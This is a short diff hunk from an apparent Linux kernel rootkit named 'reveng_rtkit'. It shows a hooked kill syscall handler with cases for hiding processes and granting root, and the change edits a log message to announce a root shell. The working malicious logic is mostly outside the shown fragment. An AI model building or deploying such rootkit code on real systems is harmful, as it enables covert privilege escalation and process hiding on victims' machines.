@@ -293,7 +293,7 @@ static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
 			printk(KERN_INFO "[*] reveng_rtkit: Hiding/unhiding pid: %d \n", pid);
 			break;
 		case GET_ROOT:
-			printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\n");
+			printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t\t\t-> Offering root shell!!");
 			/*
 				In someway system() function alike kernel function present in linux kernel programming
 				is required. in order to execute bash/sh shell then grant root shell as fish shell (in my
